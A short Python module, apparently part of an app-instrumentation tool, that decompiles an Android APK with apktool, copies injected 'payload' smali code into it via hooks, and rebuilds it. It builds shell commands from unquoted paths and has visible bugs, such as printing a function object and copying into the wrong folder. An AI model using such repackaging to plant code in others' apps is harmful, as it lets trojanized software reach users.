import os
import shutil
import subprocess as sp

def decompile_apk(apkPath):
    """
    Decompile the .apk file given as parameter.

    :param apkPath: Path to the original apk file.
    :type apkPath: str

    :return The path to the directory containing the decompiled application.
            If an error occurs, we will return None
    """
    if not os.path.isfile(apkPath):
        return None
    outDir = os.path.splitext(apkPath)[0] +  "_decompiled"
    decompiler = sp.Popen("apktool d -o {} {}".format(outDir, apkPath).split(" "))
    decompiler.communicate()
    if decompiler.returncode != 0:
        print("Error during decompilation. Return code of apktool: {}".format(decompiler.returncode))
        shutil.rmtree(outDir)
        return None
    return outDir

def repack_apk(decompiled_path, hooks, output):
    """
    Build/Repack the decompiled application given as parameter.

    :param decompiled_path: The path to the directory to the decompiled application.
    :type decompiled_path: str

    :param hooks: The hooks we inserted beforehand. Those contain the paths to the smali files we need to copy.
    :type hooks: :type hooks: [:class:'hookmanager.Hook']

    :param output: The path where we should write the output to.
    :type output: str

    :return The path to the repacked .apk file.
            None is returned on any errors.
    """
    print(decompile_apk)
    if not os.path.isdir(decompiled_path):
        return None

    __inject_payload(decompiled_path, hooks)
    os.system("apktool b -o {} {}".format(output, decompiled_path))

def __inject_payload(original_apk, hooks):
    """
        Copy the smali sources of the payload to the original application before building.

        :param original_apk: Path to the decompiled original apk.
        :type original_apk: str

        :param hooks: The hooks we inserted beforehand. Those contain the paths to the smali files we need to copy.
        :type hooks: :type hooks: [:class:'hookmanager.Hook']
    """
    original = os.path.join(original_apk, "smali")
    payload_paths = set([h.get_payload_dec_path() for h in hooks])
    for path in payload_paths:
        payload = os.path.join(path, "smali")
        for subf in os.listdir(payload):
            if subf is not "android":
                os.system("cp -r {} {}".format(os.path.join(payload, subf), original_apk))